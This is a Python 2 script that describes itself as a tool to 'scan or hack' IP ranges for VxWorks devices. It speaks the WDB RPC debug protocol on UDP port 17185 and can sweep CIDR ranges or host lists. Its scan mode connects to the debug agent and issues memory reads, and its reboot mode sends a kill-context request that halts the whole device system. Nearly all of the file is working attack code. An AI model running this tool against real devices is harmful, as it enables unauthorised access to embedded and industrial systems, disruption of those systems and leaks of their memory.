__author__ = 'qmwang'
from struct import pack, unpack
import socket
import struct
import sys
import random

from optparse import OptionGroup, OptionParser
import string
from scapy.utils import hexdump
import time

__FILTER = "".join([' '] + [' ' if chr(x) not in string.printable or chr(x)
                            in string.whitespace else chr(x) for x in range(1, 256)])

SEQNO = 0


def StringPrintable(msg):
    return msg.translate(__FILTER)


def get_ip_list(mask):
    try:
        net_addr, mask = mask.split('/')
        mask = int(mask)
        start, = struct.unpack('!L', socket.inet_aton(net_addr))
        start &= 0xFFFFFFFF << (32 - mask)
        end = start | (0xFFFFFFFF >> mask)
        return [socket.inet_ntoa(struct.pack('!L', addr)) for addr in range(start + 1, end)]
    except(struct.error, socket.error):
        return []


def pre_scan(argv):
    parser = OptionParser(
        usage="usage: %prog [options] [ip]...",
        description="Scan or hack IP range for VxWorks devices."
    )
    parser.add_option("--host-list", dest="hosts_file", help="Scan hosts from file", metavar="FILE")
    parser.add_option("--ports", dest="ports", help="Scan ports", metavar="PORTS", default=17185)
    parser.add_option("--timeout", dest="connect_timeout", help="Connection timeout(seconds)", metavar="TIMEOUT", type="float", default=1)
    parser.add_option("-s", "--scan", help="Scan VxWorks devices", default=True, action="store_true")
    parser.add_option("--reboot", help="Reboot VxWorks devices", default=False, action="store_true")
#    parser.add_option("-r", "--read", help="Read VxWorks memory",
#                      default=False, action="store_true")
#    parser.add_option("-w", "--write", help="Write VxWorks memory",
#                      default=False, action="store_true")

    (options, args) = parser.parse_args(argv)

    scan_hosts = []
    if options.hosts_file:
        try:
            scan_hosts = [file.strip()
                          for file in open(options.hosts_file, 'r')]
        except IOError:
            print "Can't open file %s" % options.hosts_file

    for ip in args:
        scan_hosts.extend(get_ip_list(ip) if '/' in ip else [ip])

    scan_ports = options.ports

    if not scan_hosts:
        print "No targets to scan\n\n"
        parser.print_help()
        exit()

    print 'Scan start...\n'
    for host in scan_hosts:
        splitted = host.split(":")
        host = splitted[0]
        if len(splitted) == 2:
            ports = [int(splitted[1])]
        else:
            ports = scan_ports
        port = ports
        print host + ':' + str(port)

        if options.reboot:
            reboot(host, port, options)
        if options.scan:
            scan(host, port, options)


class WdbrpcPacket:

    def __init__(self, procedure=0, data=''):
        self.procedure = procedure
        self.data = data

    def pack(self):
        pkt = pack('!10L',
                   0x00000000,  # random.randint(0, 0x10000000),
                   0x00000000,
                   0x00000002,
                   0x55555555,
                   0x00000001,
                   self.procedure,
                   0x00000000,
                   0x00000000,
                   0x00000000,
                   0x00000000
                   )
        pkt += pack('!3L',
                    0x00000000,  # 0xffff,
                    # self.wdbrpc_checksum()
                    0x00000000,
                    self.wdbrpc_req_seqno()
                    )
        pkt += self.data
        pktlist = list(pkt)
        pktlist[44: 48] = pack('!L', len(pkt) - 4)
        pktlist[42: 44] = pack('!H', self.wdbrpc_checksum(pktlist))
        pktlist[40: 42] = pack('!H', 0xffff)
        pktlist[0: 4] = pack('!L', random.randint(0, 0x100000000))
        return ''.join(pktlist)

    def unpack_connect_response(self, packet):
        global INDEX
        INDEX = 0
        info = {}
        pack_head = packet[:36]
        pack_data = packet[36:]
        info['agent_ver'] = self.wdbrpc_decode_str(pack_data, INDEX)
        info['agent_mtu'] = self.wdbrpc_decode_int(pack_data, INDEX)
        info['agent_mod'] = self.wdbrpc_decode_int(pack_data, INDEX)
        info['rt_type'] = self.wdbrpc_decode_int(pack_data, INDEX)
        info['rt_vers'] = self.wdbrpc_decode_str(pack_data, INDEX)
        info['rt_cpu_type'] = self.wdbrpc_decode_int(pack_data, INDEX)
        info['rt_has_fpp'] = self.wdbrpc_decode_bool(pack_data, INDEX)
        info['rt_has_wp'] = self.wdbrpc_decode_bool(pack_data, INDEX)
        info['rt_page_size'] = self.wdbrpc_decode_int(pack_data, INDEX)
        info['rt_endian'] = self.wdbrpc_decode_int(pack_data, INDEX)
        info['rt_bsp_name'] = self.wdbrpc_decode_str(pack_data, INDEX)
        info['rt_bootline'] = self.wdbrpc_decode_str(pack_data, INDEX)
        info['rt_membase'] = self.wdbrpc_decode_int(pack_data, INDEX)
        info['rt_memsize'] = self.wdbrpc_decode_int(pack_data, INDEX)
        info['rt_region_count'] = self.wdbrpc_decode_int(pack_data, INDEX)
        info['rt_regions'] = self.wdbrpc_decode_arr(pack_data, 'INT', INDEX)
        info['rt_hostpool_base'] = self.wdbrpc_decode_int(pack_data, INDEX)
        info['rt_hostpool_size'] = self.wdbrpc_decode_int(pack_data, INDEX)
        return info

    def wdbrpc_req_seqno(self):
        global SEQNO
        SEQNO = SEQNO + 1
        return SEQNO

    def wdbrpc_checksum(self, data):
        sum = 0
        i = 0
        checklist = list()
        while(i < (len(data) - 1)):
            checklist.append(ord(data[i]) * 256 + ord(data[i + 1]))
            i += 2
        for n in checklist:
            sum += n
        sum = (sum & 0xffff) + (sum >> 16)
        return (~sum) & 0xffff

    def wdbrpc_decode_str(self, data, index):
        global INDEX
        if len(data) < 4:
            return
        slen = unpack("!L", data[index: index + 4])[0]
        if slen == 0:
            return ""
        while(slen % 4 != 0):
            slen += 1
        index += 4
        statm = "!" + bytes(slen) + "B"
        INDEX = index + slen
        str_tuple = unpack(statm, data[index: index + slen])
        s = ''
        for sub in str_tuple:
            s = s + chr(sub)
        return s

    def wdbrpc_decode_int(self, data, index):
        global INDEX
        if len(data) < 4:
            return ""
        INDEX = index + 4
        return unpack("!L", data[index: index + 4])[0]

    def wdbrpc_decode_bool(self, data, index):
        global INDEX
        if len(data) < 4:
            return ""
        INDEX = index + 4
        if unpack("!L", data[index: index + 4])[0] == 0:
            return False
        else:
            return True

    def wdbrpc_decode_arr(self, data, dtype, index):
        global INDEX
        res = []
        if len(data) < 4:
            return ""

        alen = unpack("!L", data[index: index + 4])[0]
        if alen == 0:
            return res

        for n in range(0, alen):
            if dtype == 'INT':
                res.append(self.wdbrpc_decode_int(data, INDEX))
            elif dtype == 'STR':
                res.append(self.wdbrpc_decode_str(data, INDEX))
            else:  # bool type
                res.append(self.wdbrpc_decode_bool(data, INDEX))
        return res


class Wdbrpc:

    def __init__(self, ip, port=17185, timeout=8):
        self.ip = ip
        self.port = port
        self.timeout = timeout

        self.addr = (ip, port)

    def wdbrpc_request(self, procedure, data):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        pkt = WdbrpcPacket(procedure, data).pack()
        # print "------------send"
        # print hexdump(pkt)

        sock.sendto(pkt, self.addr)
        recvdata, addr = sock.recvfrom(4096)
        # print "------------recv"
        # print hexdump(recvdata)
        return recvdata

    def wdbrpc_connect(self):
        data = pack('!3L', 0x00000002, 0x000000000, 0x000000000)
        recv = self.wdbrpc_request(1, data)
        return WdbrpcPacket().unpack_connect_response(recv)

    def wdbrpc_disconnect(self):
        data = pack('!3L', 0x00000002, 0x000000000, 0x000000000)
        recv = self.wdbrpc_request(2, data)
        return WdbrpcPacket().unpack_connect_response(recv)

    def wdbrpc_request_memread(self, offset=0, length=512, params=0):
        data = pack('!3L',
                    offset,
                    length,
                    params
                    )
        self.wdbrpc_request(10, data)

    def wdbrpc_kill_context(self, ctx_type, ctx):
        data = pack("!3L",
                    ctx_type,  # 0 -> system; 3 -> task
                    ctx,  # system or task
                    0  # optons
                    )

        self.wdbrpc_request(31, data)


def scan(host, port, options):
    resp_info = Wdbrpc(host, port, options.connect_timeout).wdbrpc_connect()
    Wdbrpc(host, port, options.connect_timeout).wdbrpc_request_memread(
        resp_info["rt_membase"] + 0x700, 512)  # M6k, ARM etc
    Wdbrpc(host, port, options.connect_timeout).wdbrpc_request_memread(
        resp_info["rt_membase"] + 0x1200, 512)  # PowerPC
    Wdbrpc(host, port, options.connect_timeout).wdbrpc_request_memread(
        resp_info["rt_membase"] + 0x4200, 512)  # PC x86
    Wdbrpc(host, port, options.connect_timeout).wdbrpc_request_memread(
        resp_info["rt_membase"] + 0x600, 512)  # SPARC-lite
    print resp_info


def reboot(host, port, options):
    resp_info = Wdbrpc(host, port, options.connect_timeout).wdbrpc_connect()
    Wdbrpc(host, port, options.connect_timeout).wdbrpc_kill_context(0, 0)
    Wdbrpc(host, port, options.connect_timeout).wdbrpc_disconnect()
if __name__ == "__main__":
    try:
        pre_scan(sys.argv[1:])
        # scan()
    except KeyboardInterrupt:
        print "Scan terminated\n"
